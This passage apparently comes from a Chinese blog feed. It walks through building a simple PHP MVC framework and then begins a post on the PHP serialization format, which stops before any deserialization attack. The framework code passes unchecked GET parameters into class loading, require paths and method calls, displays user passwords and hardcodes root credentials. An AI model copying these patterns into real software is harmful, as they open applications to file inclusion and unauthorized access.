class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>password<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&lt;?php echo $data[&#x27;password&#x27;]?&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="规范项目的目录结构"><a href="#规范项目的目录结构" class="headerlink" title="规范项目的目录结构"></a>规范项目的目录结构</h2><div class="hljs code-wrapper"><pre><code class="hljs php">├─application│  ├─admin│  │  ├─controller│  │  ├─model│  │  └─view│  ├─config│  └─home│      ├─controller│      ├─model│      └─view└─framework</code></pre></div><p>新建一个项目目录，里重新规划目录结构。大致如上图。将之前编写的文件放置到相应的目录下。</p><ul><li><p>application目录为应用目录，存放业务逻辑代码，主要是前台模块，后台模块和相关的配置文件。</p><ul><li><p>config目录用于存放相关的各种配置文件</p></li><li><p>admin为后台模块</p><ul><li>controller目录</li><li>model目录</li><li>view目录</li></ul></li><li><p>home为前台模块</p><ul><li><p>controller目录</p><ul><li><p>UserController.php</p><p>由于目录变化，内容也需要进行相应的变化</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 用户模块控制器</span><span class="hljs-comment"> * 模块管理</span><span class="hljs-comment"> * 模型根据数据表创建，控制器根据模块创建</span><span class="hljs-comment"> * 一个控制器完成了一个模块的功能</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listAllAction</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModelAction();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;getAll();        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/view/user_list.php&#x27;</span>; <span class="hljs-comment">//渲染模板</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">infoAction</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>=<span class="hljs-number">1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModel();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;get(<span class="hljs-variable">$id</span>);<span class="hljs-comment">//        print_r($data);</span>        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/view/user_info.php&#x27;</span>;    &#125;&#125;</code></pre></div></li></ul></li><li><p>model目录</p><ul><li>UserModel.php</li></ul></li><li><p>view目录</p><ul><li>user_info.php</li></ul></li></ul></li><li><p>user_list.php</p></li></ul></li><li><p>framwork为框架目录，存放数据库的基础操作类和一些基础模型。</p><ul><li>base.php：框架的基础类，引导类，完成配置加载和类的自动加载</li><li>Model.php</li><li>Db.php</li></ul></li><li><p>index.php：入口文件</p></li></ul><h2 id="创建应用的公共配置文件"><a href="#创建应用的公共配置文件" class="headerlink" title="创建应用的公共配置文件"></a>创建应用的公共配置文件</h2><p>编辑application/config.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 公共配置文件</span><span class="hljs-comment"> */</span><span class="hljs-keyword">return</span> [    <span class="hljs-comment">//数据库配置</span>    <span class="hljs-string">&#x27;db&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;pass&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;dbname&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>    ],    <span class="hljs-comment">//应用的整体配置</span>    <span class="hljs-string">&#x27;app&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;default_platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;home&#x27;</span>,    ],    <span class="hljs-comment">//前台配置</span>    <span class="hljs-string">&#x27;home&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;default_controller&#x27;</span> =&gt; <span class="hljs-string">&#x27;User&#x27;</span>,        <span class="hljs-string">&#x27;default_action&#x27;</span> =&gt; <span class="hljs-string">&#x27;listAll&#x27;</span>    ],    <span class="hljs-string">&#x27;admin&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;default_controller&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,        <span class="hljs-string">&#x27;default_action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>    ]];</code></pre></div><h2 id="创建框架基础类"><a href="#创建框架基础类" class="headerlink" title="创建框架基础类"></a>创建框架基础类</h2><p>框架基础类要完成的工作有</p><ul><li>自动加载用户自定义的配置信息</li><li>完成类的自动加载</li><li>获取用户的请求：请求分发（把用户的请求发送给特定的控制器）</li></ul><p>我们在一个函数内完成所有功能</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//加载配置</span>    <span class="hljs-keyword">$this</span>-&gt;loadConfig();    <span class="hljs-comment">//注册自动加载类</span>    <span class="hljs-keyword">$this</span>-&gt;registerAutoLoad();    <span class="hljs-comment">//获取请求参数</span>    <span class="hljs-keyword">$this</span>-&gt;getRequestParams();    <span class="hljs-comment">//请求分发</span>    <span class="hljs-keyword">$this</span>-&gt;dispatch();&#125;</code></pre></div><p>loadConfig</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//加载配置</span><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadConfig</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//使用全局变量保存用户配置</span>    <span class="hljs-comment">//因为在其他文件中也要用到这些配置，所以定义为全局变量</span>    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>] = <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/config/config.php&#x27;</span>;&#125;</code></pre></div><ul><li><p>./application/config/config.php文件中的配置以一个数组的形式存放</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 公共配置文件</span><span class="hljs-comment"> */</span><span class="hljs-keyword">return</span> [    <span class="hljs-comment">//数据库配置</span>    <span class="hljs-string">&#x27;db&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;pass&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;dbname&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>    ],    <span class="hljs-comment">//应用的整体配置</span>    <span class="hljs-string">&#x27;app&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;default_platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;User&#x27;</span>,    ],    <span class="hljs-comment">//前台配置</span>    <span class="hljs-string">&#x27;home&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;default_controller&#x27;</span> =&gt; <span class="hljs-string">&#x27;User&#x27;</span>,        <span class="hljs-string">&#x27;default_action&#x27;</span> =&gt; <span class="hljs-string">&#x27;listAll&#x27;</span>    ],    <span class="hljs-string">&#x27;admin&#x27;</span> =&gt; [        <span class="hljs-string">&#x27;default_controller&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,        <span class="hljs-string">&#x27;default_action&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>    ]];</code></pre></div></li></ul><p>registerAutoLoad</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">registerAutoLoad</span>(<span class="hljs-params"></span>)</span>&#123;    spl_autoload_register([<span class="hljs-keyword">$this</span>,<span class="hljs-string">&#x27;userAutoLoad&#x27;</span>]);&#125;</code></pre></div><ul><li><p>它告诉PHP碰到没有定义的类就执行function</p></li><li><p>这里传入一个数组，第一个元素为类，第二为类的成员函数，这样的方式可以直接调用类的该方法</p></li><li><p>这里调用的是userAutoLoad</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//创建用户自定义类的加载方法</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">userAutoLoad</span>(<span class="hljs-params"><span class="hljs-variable">$className</span></span>)</span>&#123;    <span class="hljs-comment">//定义基本类的列表</span>    <span class="hljs-variable">$baseClass</span> = [        <span class="hljs-string">&#x27;Model&#x27;</span> =&gt; <span class="hljs-string">&#x27;./framework/Model.php&#x27;</span>,        <span class="hljs-string">&#x27;Db&#x27;</span> =&gt; <span class="hljs-string">&#x27;./framework/Db.php&#x27;</span>,    ];      <span class="hljs-comment">//依次进行判断，是基础类？模型类？控制器类？</span>    <span class="hljs-comment">//依次加载</span>      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$baseClass</span>[<span class="hljs-variable">$className</span>]))&#123;        <span class="hljs-keyword">require</span> <span class="hljs-variable">$baseClass</span>[<span class="hljs-variable">$className</span>];    &#125; <span class="hljs-keyword">elseif</span> (substr(<span class="hljs-variable">$className</span>,<span class="hljs-number">-5</span>) === <span class="hljs-string">&#x27;Model&#x27;</span>)&#123;        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/home/model/&#x27;</span>.<span class="hljs-variable">$className</span>.<span class="hljs-string">&#x27;php&#x27;</span>; <span class="hljs-comment">// 加载自定义模型类</span>    &#125; <span class="hljs-keyword">elseif</span> (substr(<span class="hljs-variable">$className</span>,<span class="hljs-number">-10</span>) === <span class="hljs-string">&#x27;Controller&#x27;</span>)&#123;        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/home/controller/&#x27;</span>.<span class="hljs-variable">$className</span>.<span class="hljs-string">&#x27;php&#x27;</span>; <span class="hljs-comment">// 加载自定义模型类</span>    &#125;&#125;</code></pre></div></li></ul><p>getRequestParams</p><p>需要处理的url：//?mvd1.php?p=home&amp;c=User$a=info</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//获取请求参数</span><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRequestParams</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-variable">$defPlate</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;app&#x27;</span>][<span class="hljs-string">&#x27;default_platform&#x27;</span>];    <span class="hljs-variable">$p</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]:<span class="hljs-variable">$defPlate</span>;    define(<span class="hljs-string">&#x27;PLATFORM&#x27;</span>,<span class="hljs-variable">$p</span>);    <span class="hljs-variable">$defController</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>][PLATFORM][<span class="hljs-string">&#x27;default_controller&#x27;</span>];    <span class="hljs-variable">$c</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-variable">$defController</span>;    define(<span class="hljs-string">&#x27;CONTROLLER&#x27;</span>,<span class="hljs-variable">$c</span>);    <span class="hljs-variable">$defAction</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>][PLATFORM][<span class="hljs-string">&#x27;default_action&#x27;</span>];    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]:<span class="hljs-variable">$defAction</span>;    define(<span class="hljs-string">&#x27;ACTION&#x27;</span>,<span class="hljs-variable">$a</span>);&#125;</code></pre></div><ul><li>从url中读取参数后，即可分发请求</li></ul><p>dispatch</p><div class="hljs code-wrapper"><pre><code class="hljs php">    <span class="hljs-comment">//请求分发</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatch</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//实例化控制器类</span>        <span class="hljs-variable">$controllerName</span> = CONTROLLER.<span class="hljs-string">&#x27;Controller&#x27;</span>;        <span class="hljs-variable">$controller</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$controllerName</span>;        <span class="hljs-variable">$controllerAction</span> = ACTION.<span class="hljs-string">&#x27;Action&#x27;</span>;        <span class="hljs-variable">$controller</span>-&gt;<span class="hljs-variable">$controllerAction</span>();    &#125;    <span class="hljs-comment">//?mvd1.php?p=home&amp;c=User$a=info</span>&#125;</code></pre></div><p>base.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 框架基础类、引导类</span><span class="hljs-comment"> * 1.读取配置</span><span class="hljs-comment"> * 2.自动加载类</span><span class="hljs-comment"> * 3.请求分发</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span>&#123;    <span class="hljs-comment">//创建run方法、完成框架的所有功能</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//加载配置</span>        <span class="hljs-keyword">$this</span>-&gt;loadConfig();        <span class="hljs-comment">//注册自动加载</span>        <span class="hljs-keyword">$this</span>-&gt;registerAutoLoad();        <span class="hljs-comment">//获取请求参数</span>        <span class="hljs-keyword">$this</span>-&gt;getRequestParams();        <span class="hljs-comment">//请求分发</span>        <span class="hljs-keyword">$this</span>-&gt;dispatch();    &#125;    <span class="hljs-comment">//加载配置</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadConfig</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//使用全局变量保存用户配置</span>        <span class="hljs-comment">//因为在其他文件中也要用到这些配置，所以定义为全局变量</span>        <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>] = <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/config/config.php&#x27;</span>;    &#125;    <span class="hljs-comment">//创建用户自定义类的加载方法</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">userAutoLoad</span>(<span class="hljs-params"><span class="hljs-variable">$className</span></span>)</span>&#123;        <span class="hljs-comment">//定义基本类的列表</span>        <span class="hljs-variable">$baseClass</span> = [            <span class="hljs-string">&#x27;Model&#x27;</span> =&gt; <span class="hljs-string">&#x27;./framework/Model.php&#x27;</span>,            <span class="hljs-string">&#x27;Db&#x27;</span> =&gt; <span class="hljs-string">&#x27;./framework/Db.php&#x27;</span>,        ];        <span class="hljs-comment">//依次进行判断，是基础类？模型类？控制器类？</span>        <span class="hljs-comment">//依次加载</span>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$baseClass</span>[<span class="hljs-variable">$className</span>]))&#123;            <span class="hljs-keyword">require</span> <span class="hljs-variable">$baseClass</span>[<span class="hljs-variable">$className</span>];        &#125; <span class="hljs-keyword">elseif</span> (substr(<span class="hljs-variable">$className</span>,<span class="hljs-number">-5</span>) === <span class="hljs-string">&#x27;Model&#x27;</span>)&#123;            <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/home/model/&#x27;</span>.<span class="hljs-variable">$className</span>.<span class="hljs-string">&#x27;.php&#x27;</span>; <span class="hljs-comment">// 加载自定义模型类</span>        &#125; <span class="hljs-keyword">elseif</span> (substr(<span class="hljs-variable">$className</span>,<span class="hljs-number">-10</span>) === <span class="hljs-string">&#x27;Controller&#x27;</span>)&#123;            <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/home/controller/&#x27;</span>.<span class="hljs-variable">$className</span>.<span class="hljs-string">&#x27;.php&#x27;</span>; <span class="hljs-comment">// 加载自定义模型类</span>        &#125;    &#125;    <span class="hljs-comment">//注册自动加载类</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">registerAutoLoad</span>(<span class="hljs-params"></span>)</span>&#123;        spl_autoload_register([<span class="hljs-keyword">$this</span>,<span class="hljs-string">&#x27;userAutoLoad&#x27;</span>]);    &#125;    <span class="hljs-comment">//获取请求参数</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRequestParams</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable">$defPlate</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;app&#x27;</span>][<span class="hljs-string">&#x27;default_platform&#x27;</span>];        <span class="hljs-variable">$p</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]:<span class="hljs-variable">$defPlate</span>;        define(<span class="hljs-string">&#x27;PLATFORM&#x27;</span>,<span class="hljs-variable">$p</span>);        <span class="hljs-variable">$defController</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>][PLATFORM][<span class="hljs-string">&#x27;default_controller&#x27;</span>];        <span class="hljs-variable">$c</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]:<span class="hljs-variable">$defController</span>;        define(<span class="hljs-string">&#x27;CONTROLLER&#x27;</span>,<span class="hljs-variable">$c</span>);        <span class="hljs-variable">$defAction</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;config&#x27;</span>][PLATFORM][<span class="hljs-string">&#x27;default_action&#x27;</span>];        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]:<span class="hljs-variable">$defAction</span>;        define(<span class="hljs-string">&#x27;ACTION&#x27;</span>,<span class="hljs-variable">$a</span>);    &#125;    <span class="hljs-comment">//请求分发</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatch</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">//实例化控制器类</span>        <span class="hljs-variable">$controllerName</span> = CONTROLLER.<span class="hljs-string">&#x27;Controller&#x27;</span>;        <span class="hljs-variable">$controller</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$controllerName</span>;        <span class="hljs-variable">$controllerAction</span> = ACTION.<span class="hljs-string">&#x27;Action&#x27;</span>;        <span class="hljs-variable">$controller</span>-&gt;<span class="hljs-variable">$controllerAction</span>();    &#125;    <span class="hljs-comment">//?mvd1.php?p=home&amp;c=User$a=info</span>&#125;</code></pre></div><h2 id="创建框架的入口文件"><a href="#创建框架的入口文件" class="headerlink" title="创建框架的入口文件"></a>创建框架的入口文件</h2><ul><li>导入框架基础类</li><li>实例化基础类</li><li>开始运行</li></ul><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 入口文件</span><span class="hljs-comment"> */</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./framework/Base.php&#x27;</span>;<span class="hljs-comment">//实例化框架</span><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> Base();<span class="hljs-comment">//让框架跑起来</span><span class="hljs-variable">$app</span>-&gt;run();</code></pre></div><p>修改了几处错误</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> * 用户模块控制器</span><span class="hljs-comment"> * 模块管理</span><span class="hljs-comment"> * 模型根据数据表创建，控制器根据模块创建</span><span class="hljs-comment"> * 一个控制器完成了一个模块的功能</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listAllAction</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModel();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;getAll();        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/&#x27;</span>.PLATFORM.<span class="hljs-string">&#x27;/view/user_list.php&#x27;</span>; <span class="hljs-comment">//渲染模板</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">infoAction</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>=<span class="hljs-number">1</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//实例化模型，获取数据</span>        <span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> UserModel();        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$usr</span>-&gt;get(<span class="hljs-variable">$id</span>);<span class="hljs-comment">//        print_r($data);</span>        <span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./application/&#x27;</span>.PLATFORM.<span class="hljs-string">&#x27;/view/user_info.php&#x27;</span>;    &#125;&#125;</code></pre></div><p>加载模板文件时，应该按照指定的platform来进行加载。</p><p>成功加载。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
      <category>php框架基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>php框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php 反序列化</title>
    <link href="/2020/09/20/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/09/20/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p>知识整合，搬运工</p><h2 id="0x01-PHP-序列化（serialize）格式详解"><a href="#0x01-PHP-序列化（serialize）格式详解" class="headerlink" title="0x01 PHP 序列化（serialize）格式详解"></a>0x01 PHP 序列化（serialize）格式详解</h2><p>PHP 序列化后的内容是简单的文本格式，但是对字母大小写和空白（空格、回车、换行等）敏感，而且字符串是按照字节（或者说是 8 位的字符）计算的，因此，更合适的说法是 PHP 序列化后的内容是字节流格式。<strong>因此用其他语言实现时，如果所实现的语言中的字符串不是字节储存格式，而是 Unicode 储存格式的话，序列化后的内容不适合保存为字符串，而应保存为字节流对象或者字节数组，否则在与 PHP 进行数据交换时会产生错误。</strong></p><p>PHP 对不同类型的数据用不同的字母进行标示，Yahoo 开发网站提供的 <a href="http://developer.yahoo.com/common/phpserial.html">Using Serialized PHP with Yahoo! Web Services</a> 一文中给出所有的字母标示及其含义：</p><blockquote><ul><li>a - array</li><li>b - boolean</li><li>d - double</li><li>i - integer</li><li>o - common object</li><li>r - reference</li><li>s - string</li><li>C - custom object</li><li>O - class</li><li>N - null</li><li>R - pointer reference</li><li>U - unicode string</li></ul></blockquote><p>对普通字符串的序列化也分成了 2 种。<strong>一种是 non-escaped 字符串，也就是我们上面说的那个小写 s 标识的字符串；另一种是 escaped 字符串，这种字符串格式用大写 S 标识。</strong>所以上面那个表现在应该改为：</p><blockquote><ul><li>a - array</li><li>b - boolean</li><li>d - double</li><li>i - integer</li><li>o - common object</li><li>r - reference</li><li>s - non-escaped binary string</li><li>S - escaped binary string</li><li>C - custom object</li><li>O - class</li><li>N - null</li><li>R - pointer reference</li><li>U - unicode string</li></ul></blockquote><h3 id="3．NULL-和标量类型的序列化"><a href="#3．NULL-和标量类型的序列化" class="headerlink" title="3．NULL 和标量类型的序列化"></a>3．NULL 和标量类型的序列化</h3><p>NULL 和标量类型的序列化是最简单的，也是构成符合类型序列化的基础。这部分内容相信许多 PHP 开发者都已经熟知。如果您感觉已经掌握了这部分内容，可以直接跳过这一章。</p><h4 id="3-1．NULL-的序列化"><a href="#3-1．NULL-的序列化" class="headerlink" title="3.1．NULL 的序列化"></a>3.1．NULL 的序列化</h4><p>在 PHP 中，NULL 被序列化为：</p><p>N;</p><h4 id="3-2．boolean-型数据的序列化"><a href="#3-2．boolean-型数据的序列化" class="headerlink" title="3.2．boolean 型数据的序列化"></a>3.2．boolean 型数据的序列化</h4><p>boolean 型数据被序列化为：</p><p><code>b:&lt;digit&gt;;</code></p><p>其中 <digit> 为 0 或 1，当 boolean 型数据为 false 时，<digit> 为 0，否则为 1。</p><h4 id="3-3．integer-型数据的序列化"><a href="#3-3．integer-型数据的序列化" class="headerlink" title="3.3．integer 型数据的序列化"></a>3.3．integer 型数据的序列化</h4><p>integer 型数据（整数）被序列化为：</p><p><code>i:&lt;number&gt;;</code></p><p>其中 <number> 为一个整型数，范围为：-2147483648 到 2147483647。数字前可以有正负号，如果被序列化的数字超过这个范围，则会被序列化为浮点数类型而不是整型。如果序列化后的数字超过这个范围 （PHP 本身序列化时不会发生这个问题），则反序列化时，将不会返回期望的数值。</p><h4 id="3-4．double-型数据的序列化"><a href="#3-4．double-型数据的序列化" class="headerlink" title="3.4．double 型数据的序列化"></a>3.4．double 型数据的序列化</h4><p>double 型数据（浮点数）被序列化为：</p><p><code>d:&lt;number&gt;;</code></p><p>其中 <number> 为一个浮点数，其范围与 PHP 中浮点数的范围一样。可以表示成整数形式、浮点数形式和科学技术法形式。如果序列化无穷大数，则 <number> 为 INF，如果序列化负无穷大，则 <number> 为 -INF。序列化后的数字范围超过 PHP 能表示的最大值，则反序列化时返回无穷大（INF），如果序列化后的数字范围超过 PHP 所能表示的最小精度，则反序列化时返回 0。当浮点数为非数时，被序列化为 NAN，NAN 反序列化时返回 0。但其它语言可以将 NAN 反序列化为相应语言所支持的 NaN 表示。</p><h4 id="3-5．string-型数据的序列化"><a href="#3-5．string-型数据的序列化" class="headerlink" title="3.5．string 型数据的序列化"></a>3.5．string 型数据的序列化</h4><p>string 型数据（字符串）被序列化为：</p><p><code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</code></p><p>其中 <length> 是 <value> 的长度，<length> 是非负整数，数字前可以带有正号（+）。<value> 为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 - 255 的字符相对应。每个字符都表示原字符含义，没有转义字符，<value> 两边的引号（””）是必须的，但不计算在 <length> 当中。这里的 <value> 相当于一个字节流，而 <length> 是这个字节流的字节个数。</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在 PHP5 最新的 CVS 中（也就是将来要发布的 PHP6），上面对于 string 型数据的序列化方式已经被下面这种所取代，但是 PHP6 仍然支持上面那种序列化方式的反序列化。</p><p>新的序列化方式叫做 escaped binary string 方式，这是相对与上面那种 non-escaped binary string 方式来说的：</p><p>string 型数据（字符串）新的序列化格式为：</p><p><code>S:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</code></p><p>其中 <length> 是源字符串的长度，而非 <value> 的长度。<length> 是非负整数，数字前可以带有正号（+）。<value> 为经过转义之后的字符串。</p><p>它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 <value> 的内容了。</p><h3 id="4．简单复合类型的序列化"><a href="#4．简单复合类型的序列化" class="headerlink" title="4．简单复合类型的序列化"></a>4．简单复合类型的序列化</h3><p>PHP 